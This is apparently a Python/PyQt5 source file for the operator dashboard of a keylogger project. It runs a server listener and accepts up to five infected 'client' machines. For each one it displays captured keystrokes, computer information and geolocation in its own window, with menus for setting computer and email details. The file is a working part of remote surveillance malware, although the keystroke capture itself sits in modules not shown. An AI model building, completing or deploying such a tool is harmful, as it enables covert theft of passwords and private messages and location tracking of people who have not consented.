import sys
import threading

from PyQt5.QtWidgets import QApplication, QMainWindow, QTextEdit, QVBoxLayout, QWidget, QLabel
from PyQt5.QtCore import pyqtSignal, QObject

from keylogger.Networking.server import Worker

from keylogger.clients.client2 import Ui_Widget2
from keylogger.clients.client3 import Ui_Widget3
from keylogger.clients.client4 import Ui_Widget4
from keylogger.clients.client5 import Ui_Widget5

from keylogger.gui.controllers.Dashboard import Ui_MainWindow
from keylogger.gui.controllers.SetComputerInfo import Ui_SetComputerInfo
from keylogger.gui.controllers.SetEmailInfo import Ui_SetEmaiInfo


class ClientWindow(QMainWindow):
    def __init__(self, client_id, client_number):
        super().__init__()
        self.client_id = client_id
        self.client_number = client_number
        self.setWindowTitle(f"Client {client_number} - {client_id}")

        print(f"[DEBUG] Initializing ClientWindow for Client {client_number} with ID {client_id}")

        if client_number == 2:
            self.ui = Ui_Widget2()
        elif client_number == 3:
            self.ui = Ui_Widget3()
        elif client_number == 4:
            self.ui = Ui_Widget4()
        elif client_number == 5:
            self.ui = Ui_Widget5()
        else:
            print(f"[DEBUG] No UI defined for client number {client_number}, using default text area.")
            layout = QVBoxLayout()
            self.client_label = QLabel(f"Client {client_number} Data")
            layout.addWidget(self.client_label)
            self.text_edit = QTextEdit()
            self.text_edit.setReadOnly(True)
            layout.addWidget(self.text_edit)
            container = QWidget()
            container.setLayout(layout)
            self.setCentralWidget(container)
            return

        self.ui.setupUi(self)
        print(f"[DEBUG] UI setup complete for Client {client_number}")


class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        print("[DEBUG] Initializing MainWindow and UI")
        self.ui = Ui_MainWindow()
        self.ui.setupUi(self)
        self.client_windows = {}
        self.client1_id = None
        self.client1_socket = None

        # Connect UI signals
        self.ui.SetComputerInfo.clicked.connect(self.open_set_computer_info_window)
        self.ui.actionSet_Email_Info.triggered.connect(self.open_set_email_info_window)
        self.ui.RefreshButton.clicked.connect(self.refresh_logs)
        self.ui.actionLight_Mode.triggered.connect(self.set_light_mode)
        self.ui.actionDark_Mode.triggered.connect(self.set_dark_mode)
        self.ui.ComputerSelection.currentIndexChanged.connect(self.handle_client_selection)

        # Clear dropdown and add placeholder
        self.ui.ComputerSelection.clear()
        self.ui.ComputerSelection.addItem("Client 1 (No Connection)")
        print("[DEBUG] Added placeholder for Client 1 (No Connection)")

        self.start_server_listener()

    def start_server_listener(self):
        print("[DEBUG] Starting server listener thread")
        self.worker = Worker(self)
        self.worker.keylog_signal.connect(self.update_keylog_for_client)
        self.worker.computer_info_signal.connect(self.update_computer_info_for_client)
        self.worker.geo_location_signal.connect(self.update_geo_location_for_client)

        thread = threading.Thread(target=self.worker.start_server, daemon=True)
        thread.start()
        print("[DEBUG] Server listener thread started")

    def handle_new_client(self, client_id, client_socket):
        print(f"[DEBUG] Handling new client {client_id}")

        if self.client1_id is None:
            self.client1_id = client_id
            self.client1_socket = client_socket
            print(f"[DEBUG] Assigned {client_id} as Client 1 (main window)")

            index = self.ui.ComputerSelection.findText("Client 1 (No Connection)")
            if index >= 0:
                self.ui.ComputerSelection.setItemText(index, client_id)
                self.ui.ComputerSelection.setCurrentIndex(index)
            else:
                self.ui.ComputerSelection.addItem(client_id)
                self.ui.ComputerSelection.setCurrentIndex(self.ui.ComputerSelection.count()-1)

            client_thread = threading.Thread(target=self.worker.handle_client, args=(client_id, client_socket), daemon=True)
            client_thread.start()
            print(f"[DEBUG] Started handler thread for Client 1")
        else:
            if len(self.client_windows) >= 4:
                print("[-] Max clients reached, rejecting connection")
                client_socket.close()
                return
            client_number = len(self.client_windows) + 2
            print(f"[DEBUG] Assigned {client_id} as Client {client_number}")

            client_window = ClientWindow(client_id, client_number)
            client_window.show()
            self.client_windows[client_id] = client_window

            self.ui.ComputerSelection.addItem(client_id)

            client_thread = threading.Thread(target=self.worker.handle_client, args=(client_id, client_socket), daemon=True)
            client_thread.start()
            print(f"[DEBUG] Started handler thread for Client {client_number}")

    def handle_client_disconnection(self, client_id):
        print(f"[DEBUG] Handling disconnection for {client_id}")
        if client_id == self.client1_id:
            print(f"[DEBUG] Client 1 disconnected")
            self.client1_id = None
            self.client1_socket = None

            index = self.ui.ComputerSelection.findText(client_id)
            if index >= 0:
                self.ui.ComputerSelection.setItemText(index, "Client 1 (No Connection)")
                self.ui.ComputerSelection.setCurrentIndex(index)
        elif client_id in self.client_windows:
            print(f"[DEBUG] Closing window for client {client_id}")
            self.client_windows[client_id].close()
            del self.client_windows[client_id]

            index = self.ui.ComputerSelection.findText(client_id)
            if index >= 0:
                self.ui.ComputerSelection.removeItem(index)

    def handle_received_data(self, data, client_id):
        print(f"[DEBUG] Received data from {client_id}: {data}")
        if "KEYLOG" in data:
            print(f"[DEBUG] Emitting keylog signal for {client_id}")
            self.worker.keylog_signal.emit(client_id, data)
        elif "COMPUTER_INFO" in data:
            print(f"[DEBUG] Emitting computer info signal for {client_id}")
            self.worker.computer_info_signal.emit(client_id, data)
        elif "GEO_LOCATION" in data:
            print(f"[DEBUG] Emitting geo location signal for {client_id}")
            self.worker.geo_location_signal.emit(client_id, data)
        else:
            print(f"[WARNING] Unknown data type received from {client_id}: {data}")

    def handle_client_selection(self, index):
        if index < 0:
            print("[DEBUG] ComputerSelection changed to invalid index")
            return
        client_id = self.ui.ComputerSelection.itemText(index)
        print(f"[DEBUG] ComputerSelection changed to index {index}, selected client: {client_id}")

        if client_id == "Client 1 (No Connection)":
            print("[DEBUG] No Client 1 connected, ignoring selection")
            return

        if client_id == self.client1_id:
            print("[DEBUG] Selected Client 1 (main window), focusing main window")
            self.show()
            self.raise_()
            self.activateWindow()
        elif client_id in self.client_windows:
            window = self.client_windows[client_id]
            if not window.isVisible():
                window.show()
            window.raise_()
            window.activateWindow()
        else:
            print(f"[WARNING] Selected client {client_id} has no window")

    def update_keylog_for_client(self, client_id, log_line):
        print(f"[DEBUG] Updating keylog for {client_id}")
        if client_id == self.client1_id:
            try:
                self.ui.Client1_Keyloggs.appendPlainText(log_line)
            except Exception as e:
                print(f"[ERROR] Updating Client1_Keyloggs: {e}")
        elif client_id in self.client_windows:
            window = self.client_windows[client_id]
            ui = window.ui
            try:
                getattr(ui, f"Client{window.client_number}_Keyloggs").appendPlainText(log_line)
            except Exception as e:
                print(f"[ERROR] Updating keylog for client window: {e}")

    def update_computer_info_for_client(self, client_id, info):
        print(f"[DEBUG] Updating computer info for {client_id}")
        if client_id == self.client1_id:
            try:
                self.ui.Client1_ComputerInformation.setPlainText(info)
            except Exception as e:
                print(f"[ERROR] Updating Client1_ComputerInformation: {e}")
        elif client_id in self.client_windows:
            window = self.client_windows[client_id]
            ui = window.ui
            try:
                getattr(ui, f"Client{window.client_number}_ComputerInformation").setPlainText(info)
            except Exception as e:
                print(f"[ERROR] Updating computer info for client window: {e}")

    def update_geo_location_for_client(self, client_id, location):
        print(f"[DEBUG] Updating geo location for {client_id}")
        if client_id == self.client1_id:
            try:
                self.ui.Client1_GeoLocation.setPlainText(location)
            except Exception as e:
                print(f"[ERROR] Updating Client1_GeoLocation: {e}")
        elif client_id in self.client_windows:
            window = self.client_windows[client_id]
            ui = window.ui
            try:
                getattr(ui, f"Client{window.client_number}_GeoLocation").setPlainText(location)
            except Exception as e:
                print(f"[ERROR] Updating geo location for client window: {e}")

    def open_set_computer_info_window(self):
        self.child_window1 = QMainWindow()
        self.child_ui1 = Ui_SetComputerInfo()
        self.child_ui1.setupUi(self.child_window1)
        self.child_window1.show()

    def open_set_email_info_window(self):
        self.child_window2 = QMainWindow()
        self.child_ui2 = Ui_SetEmaiInfo()
        self.child_ui2.setupUi(self.child_window2)
        self.child_window2.show()

    def refresh_logs(self):
        print("[DEBUG] Refreshing logs...")

    def set_light_mode(self):
        self.setStyleSheet("background-color: white; color: black;")
        print("[DEBUG] Switched to light mode.")

    def set_dark_mode(self):
        self.setStyleSheet("background-color: #2E2E2E; color: white;")
        print("[DEBUG] Switched to dark mode.")


# App launcher for Main.py
def main():
    print("[DEBUG] Launching application")
    app = QApplication(sys.argv)
    main_window = MainWindow()
    main_window.show()
    print("[DEBUG] Application started, entering main loop")
    sys.exit(app.exec_())
